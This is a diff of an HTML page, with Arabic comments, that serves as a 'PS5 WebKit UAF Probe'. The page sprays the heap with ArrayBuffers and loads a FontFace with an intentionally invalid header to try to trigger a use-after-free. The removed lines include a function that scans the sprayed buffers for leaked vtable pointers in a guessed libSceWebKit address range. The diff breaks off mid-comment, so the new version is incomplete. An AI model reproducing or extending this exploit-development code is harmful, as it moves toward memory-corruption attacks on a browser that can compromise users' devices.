@@ -1,77 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Memory Grooming & UAF Probe</title>
+    <meta charset="UTF-8">
+    <title>PS5 WebKit UAF Probe</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        #status { font-weight: bold; color: #ffffff; }
+    </style>
 </head>
 <body>
     <h1>WebKit Memory Grooming Probe</h1>
-    <p>Status: <span id="status">Initializing...</span></p>
+    <p>الحالة: <span id="status">جاري التهيئة...</span></p>
 
     <script>
-        // تصحيح الأخطاء المطبعية في الكود الأصلي (Let -> let)
+        let heapSpray = [];
+        const TARGET_SIZE = 0x1000; // حجم الصفحة الافتراضي 4KB
+
         async function runExploitProbe() {
-            document.getElementById('status').innerText = "Grooming Heap...";
-            
-            let heapSpray = [];
+            document.getElementById('status').innerText = "جاري حشو الذاكرة (Grooming Heap)...";
             
             // 1. مرحلة حشو الذاكرة (Heap Grooming)
-            // نستخدم 500 كائن لتهيئة مساحة الذاكرة المخصصة (IsoSubspace)
+            // نستخدم 500 كائن لتهيئة مساحة الذاكرة المخصصة وتحديد الفتحات
             for (let i = 0; i < 500; i++) {
-                let blockSize = 0x1000 + (i % 2 === 0 ? 16 : 32); 
+                let blockSize = TARGET_SIZE + (i % 2 === 0 ? 16 : 32); 
                 heapSpray.push(new ArrayBuffer(blockSize));
             }
             
-            document.getElementById('status').innerText = "Triggering UAF...";
+            document.getElementById('status').innerText = "جاري تحفيز الثغرة (Triggering UAF)...";
 
-            // 2. إنشاء FontFace ومحاولة إدخاله في حالة معلقة
             try {
-                // ترويسة خط غير صالحة عمداً لتحفيز معالجة الخطأ داخل mayTryReplaceEncodedData
+                // محاولة إدخال كائن الخط في حالة معلقة عبر ترويسة غير صالحة
                 let font = new FontFace('TestFont', 'url(data:font/opentype;base64,AAAA)');
-                
-                // بدء التحميل غير المتزامن
                 let loadPromise = font.load();
                 
-                // مراقبة النتيجة
-                await loadPromise.then(() => {
-                    document.getElementById('status').innerText = "Load Success - No UAF Triggered.";
-                }).catch((e) => {
-                    document.getElementById('status').innerText = "Load Failed (Expected) - Analyzing State...";
-                    // هنا يمكن إضافة منطق قراءة الذاكرة إذا حدث Crash آمن
-                });
-                
-            } catch (err) {
-                document.getElementById('status').innerText = "Error: " + err.message;
-            }
-        }
-
-        // تشغيل الاختبار بعد تحميل الصفحة
-        window.onload = runExploitProbe;
-        // دالة فحص الذاكرة (Memory Probe)
-async function probeMemoryForVTable() {
-    document.getElementById('status').innerText = "Probing Heap for VTable...";
-    
-    // نقوم بمسح مصفوفات الحشو للبحث عن قيم غير طبيعية (VTable pointers)
-    for (let i = 0; i < heapSpray.length; i++) {
-        let view = new DataView(heapSpray[i]);
-        
-        // محاولة قراءة أول 8 بايتات (مكان الـ VTable)
-        try {
-            let potentialVTable = view.getBigUint64(0, true);
-            
-            // نطاق عناوين libSceWebKit (نبحث عن عناوين في نطاق محدد)
-            // ملاحظة: هذه العناوين افتراضية ويجب مطابقتها مع الـ Offsets في بيئتك
-            if (potentialVTable > 0x100000000n && potentialVTable < 0x800000000n) {
-                console.log("Found potential VTable leak at index " + i + ": " + potentialVTable.toString(16));
-                document.getElementById('status').innerText = "VTable Leaked: " + potentialVTable.toString(16);
-                return; // تم العثور على التسريب
-            }
-        } catch (e) {
-            continue;
-        }
-    }
-    document.getElementById('status').innerText = "Probe Failed - Adjust Spray Geometry.";
-}
-
-    </script>
-</body>
-</html>
+                //
